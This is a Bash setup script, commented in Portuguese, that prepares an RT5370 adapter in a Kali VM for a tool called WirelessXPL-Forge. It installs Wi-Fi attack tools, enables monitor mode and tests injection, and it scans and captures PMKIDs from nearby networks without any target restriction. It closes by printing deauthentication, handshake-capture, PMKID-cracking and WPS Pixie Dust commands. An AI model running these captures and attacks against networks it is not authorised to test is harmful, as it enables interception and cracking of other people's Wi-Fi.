#!/usr/bin/env bash
# kali_setup_rt5370.sh — Setup completo do RT5370 na VM Kali Linux
# Execute como root dentro da VM Kali: sudo bash kali_setup_rt5370.sh
#
# O que faz:
#   1. Verifica presença do adaptador USB RT5370
#   2. Instala firmware e ferramentas necessárias
#   3. Carrega módulos do driver rt2800usb
#   4. Coloca wlan0 em monitor mode
#   5. Executa scan de APs próximos
#   6. Executa testes básicos de airodump-ng e handshake capture
#   7. Testa packet injection com aireplay-ng

set -euo pipefail
export DEBIAN_FRONTEND=noninteractive

RED='\033[0;31m'
GRN='\033[0;32m'
YLW='\033[1;33m'
CYN='\033[0;36m'
NC='\033[0m'

info()  { echo -e "${CYN}[*]${NC} $*"; }
ok()    { echo -e "${GRN}[+]${NC} $*"; }
warn()  { echo -e "${YLW}[!]${NC} $*"; }
fail()  { echo -e "${RED}[X]${NC} $*"; exit 1; }

echo ""
echo "================================================================"
echo "  WirelessXPL-Forge — Kali VM RT5370 Setup & Attack Runner"
echo "================================================================"
echo ""

# ---------------------------------------------------------------------------
# 0. Deve ser root
# ---------------------------------------------------------------------------
[[ $EUID -eq 0 ]] || fail "Execute como root: sudo bash $0"

# ---------------------------------------------------------------------------
# 1. Verificar RT5370
# ---------------------------------------------------------------------------
info "Verificando RT5370 (VID:148f PID:5370)..."
if ! lsusb | grep -qi "148f:5370"; then
    fail "RT5370 nao detectado! Conecte o adaptador USB na VM via VirtualBox -> Dispositivos -> USB -> Ralink 802.11n WLAN"
fi
ok "RT5370 detectado: $(lsusb | grep -i 148f)"

# ---------------------------------------------------------------------------
# 2. Instalar dependências
# ---------------------------------------------------------------------------
info "Atualizando repositórios e instalando ferramentas..."
apt-get update -qq
apt-get install -y --no-install-recommends \
    aircrack-ng \
    hcxdumptool \
    hcxtools \
    hashcat \
    reaver \
    bully \
    pixiewps \
    bettercap \
    mdk4 \
    iw \
    wireless-tools \
    firmware-ralink \
    firmware-misc-nonfree \
    python3-pip \
    net-tools \
    tcpdump \
    macchanger 2>&1 | tail -5

ok "Dependências instaladas."

# ---------------------------------------------------------------------------
# 3. Carregar módulos do driver
# ---------------------------------------------------------------------------
info "Carregando módulos rt2800usb..."
modprobe rt2800usb || true
modprobe mac80211  || true
sleep 1

# Verificar se wlan apareceu
WLAN_IFACE=$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | head -1)
if [[ -z "$WLAN_IFACE" ]]; then
    warn "Nenhuma interface wlan detectada. Tentando recarregar..."
    rmmod rt2800usb rt2x00usb rt2800lib rt2x00lib 2>/dev/null || true
    sleep 1
    modprobe rt2800usb
    sleep 2
    WLAN_IFACE=$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | head -1)
fi

[[ -n "$WLAN_IFACE" ]] || fail "Interface wlan ainda nao detectada. Verifique: dmesg | grep rt2800"
ok "Interface WiFi detectada: $WLAN_IFACE"

# Informações do adaptador
info "Detalhes do adaptador:"
iw dev "$WLAN_IFACE" info
PHY=$(iw dev "$WLAN_IFACE" info | awk '/wiphy/{print "phy"$2}')
info "PHY: $PHY"
iw phy "$PHY" info | grep -A5 "Supported interface modes:" || true

# ---------------------------------------------------------------------------
# 4. Monitor mode
# ---------------------------------------------------------------------------
info "Configurando monitor mode em $WLAN_IFACE..."

# Matar processos que interferem
airmon-ng check kill 2>/dev/null || true
sleep 1

# Ativar monitor mode
if airmon-ng start "$WLAN_IFACE" 2>&1 | grep -q "monitor mode"; then
    MON_IFACE="${WLAN_IFACE}mon"
    [[ -d /sys/class/net/$MON_IFACE ]] || MON_IFACE="$WLAN_IFACE"
else
    # Alternativa manual via iw
    ip link set "$WLAN_IFACE" down
    iw dev "$WLAN_IFACE" set type monitor
    ip link set "$WLAN_IFACE" up
    MON_IFACE="$WLAN_IFACE"
fi

ok "Monitor mode ativo: $MON_IFACE"
iwconfig "$MON_IFACE" 2>/dev/null || iw dev "$MON_IFACE" info

# ---------------------------------------------------------------------------
# 5. Verificar capacidade de injection
# ---------------------------------------------------------------------------
info "Testando packet injection..."
INJECT_TEST=$(aireplay-ng --test "$MON_IFACE" 2>&1 | tail -5)
echo "$INJECT_TEST"
if echo "$INJECT_TEST" | grep -q "injection is working"; then
    ok "Packet injection: FUNCIONANDO!"
else
    warn "Injection pode não estar funcionando perfeitamente (normal em algumas configs)."
fi

# ---------------------------------------------------------------------------
# 6. Scan de APs próximos (20 segundos)
# ---------------------------------------------------------------------------
SCAN_FILE="/tmp/wxf_scan_$(date +%Y%m%d_%H%M%S)"
info "Scan de APs próximos por 20 segundos..."
info "Saída: ${SCAN_FILE}.csv"

timeout 20 airodump-ng \
    --write "$SCAN_FILE" \
    --output-format csv \
    --band bg \
    "$MON_IFACE" 2>/dev/null || true

echo ""
if [[ -f "${SCAN_FILE}-01.csv" ]]; then
    APS=$(grep -c "Station MAC" "${SCAN_FILE}-01.csv" 2>/dev/null || echo 0)
    ok "Scan concluído. APs e clientes detectados:"
    head -30 "${SCAN_FILE}-01.csv" | grep -v "^$" | head -20
else
    warn "Arquivo CSV não gerado — verifique permissões ou monitor mode."
fi

# ---------------------------------------------------------------------------
# 7. PMKID capture (hcxdumptool - 30 segundos)
# ---------------------------------------------------------------------------
PMKID_FILE="/tmp/wxf_pmkid_$(date +%Y%m%d_%H%M%S).pcapng"
info "Capturando PMKID por 30 segundos via hcxdumptool..."
info "Saída: $PMKID_FILE"

timeout 30 hcxdumptool \
    -i "$MON_IFACE" \
    -o "$PMKID_FILE" \
    --enable_status=3 2>&1 | tail -10 || true

if [[ -f "$PMKID_FILE" ]]; then
    PMKID_COUNT=$(hcxpcapngtool "$PMKID_FILE" --all 2>&1 | grep -c "PMKID" || echo 0)
    ok "PMKID capture: $PMKID_FILE (PMKIDs detectados: $PMKID_COUNT)"
fi

# ---------------------------------------------------------------------------
# 8. Restaurar managed mode
# ---------------------------------------------------------------------------
info "Restaurando managed mode..."
airmon-ng stop "$MON_IFACE" 2>/dev/null || ip link set "$MON_IFACE" down
iw dev "$WLAN_IFACE" set type managed 2>/dev/null || true
ip link set "$WLAN_IFACE" up 2>/dev/null || true

# ---------------------------------------------------------------------------
# Resumo
# ---------------------------------------------------------------------------
echo ""
echo "================================================================"
echo "  RESUMO DO SETUP RT5370 NA VM KALI"
echo "================================================================"
echo "  Interface WiFi: $WLAN_IFACE"
echo "  Monitor mode:   $MON_IFACE"
echo "  Scan CSV:       ${SCAN_FILE}-01.csv"
echo "  PMKID pcapng:   $PMKID_FILE"
echo ""
echo "  PROXIMOS PASSOS (executar manualmente):"
echo ""
echo "  1. Monitor mode:"
echo "     airmon-ng start $WLAN_IFACE"
echo ""
echo "  2. Scan interativo:"
echo "     airodump-ng ${WLAN_IFACE}mon"
echo ""
echo "  3. Deauth + handshake capture:"
echo "     airodump-ng -c <CH> --bssid <BSSID> -w /tmp/cap ${WLAN_IFACE}mon &"
echo "     aireplay-ng -0 5 -a <BSSID> ${WLAN_IFACE}mon"
echo ""
echo "  4. PMKID attack:"
echo "     hcxdumptool -i ${WLAN_IFACE}mon -o /tmp/pmkid.pcapng --enable_status=3"
echo "     hcxpcapngtool /tmp/pmkid.pcapng -o /tmp/pmkid.hash"
echo "     hashcat -m 22000 /tmp/pmkid.hash wordlist.txt"
echo ""
echo "  5. WPS Pixie Dust:"
echo "     wash -i ${WLAN_IFACE}mon"
echo "     reaver -i ${WLAN_IFACE}mon -b <BSSID> -vvv -K 1"
echo ""
echo "  6. WirelessXPL-Forge (via pasta compartilhada):"
echo "     python3 /mnt/shared/WirelessXPL-Forge/wirelessxpl.py"
echo "================================================================"
echo ""
